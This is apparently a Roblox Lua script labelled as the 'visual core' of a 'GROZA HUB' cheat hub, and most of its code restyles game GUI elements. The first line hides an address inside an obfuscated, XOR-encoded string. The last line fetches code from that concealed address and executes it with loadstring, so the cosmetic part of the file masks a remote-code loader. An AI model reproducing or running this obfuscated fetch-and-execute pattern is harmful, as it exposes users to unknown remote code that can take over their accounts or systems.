
--[[ STAGE 2: VISUAL CORE ]]
local r1R3IJSs_lSjaFzU="\196\179\207\144\204\205\214\197\214\226\226\234\228\244\219\179\247\255\250\001\194\241\003\009\008\024\212\003\019\023\013\227\032\033\042\025\042\054\054\062\056\072\047\007\055\072\084\065\022\091\092\091\035\080\105\101\089\114\116\115\103\119\108\109\131\115\147\122\152\141\089\131\156\142\100\103\095\153\159\158\161\192"local WxV8hM9ADkpK6J=183 local xEluNdRrx9q63_IPC=206 local qJVtzKgTYtQQQc1=0 local m03TzFg_iF4H4rT8nYJJ9O=3 local ErmLfjeO_Zqbhb62=29 local rkpD8zOdVkJR4NfuSSX_dS=true local HUbRYeXiA78jic45v=bit32 and bit32.bxor if not HUbRYeXiA78jic45v then HUbRYeXiA78jic45v=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local mtzUSGttUhIArR={}for rdpHycqtY8BVoRAvlGj=1,#r1R3IJSs_lSjaFzU do local Ied8ngugAZy0ETz6mNpm=string.byte(r1R3IJSs_lSjaFzU,rdpHycqtY8BVoRAvlGj)local NT4HNwusOTbTQ0U=(xEluNdRrx9q63_IPC+(rdpHycqtY8BVoRAvlGj*m03TzFg_iF4H4rT8nYJJ9O)+ErmLfjeO_Zqbhb62)%256 if qJVtzKgTYtQQQc1==0 then Ied8ngugAZy0ETz6mNpm=(Ied8ngugAZy0ETz6mNpm-NT4HNwusOTbTQ0U)%256 mtzUSGttUhIArR[rdpHycqtY8BVoRAvlGj]=string.char(HUbRYeXiA78jic45v(Ied8ngugAZy0ETz6mNpm,WxV8hM9ADkpK6J))else Ied8ngugAZy0ETz6mNpm=HUbRYeXiA78jic45v(Ied8ngugAZy0ETz6mNpm,WxV8hM9ADkpK6J)mtzUSGttUhIArR[rdpHycqtY8BVoRAvlGj]=string.char((Ied8ngugAZy0ETz6mNpm-NT4HNwusOTbTQ0U)%256)end end local CVCAOJtsXQrXpgZQ2Nqh=table.concat(mtzUSGttUhIArR)if rkpD8zOdVkJR4NfuSSX_dS then CVCAOJtsXQrXpgZQ2Nqh=string.reverse(CVCAOJtsXQrXpgZQ2Nqh)end local hc3KgXJw20rxoxVLV=CVCAOJtsXQrXpgZQ2Nqh
local HubName = "GROZA HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(hc3KgXJw20rxoxVLV))()
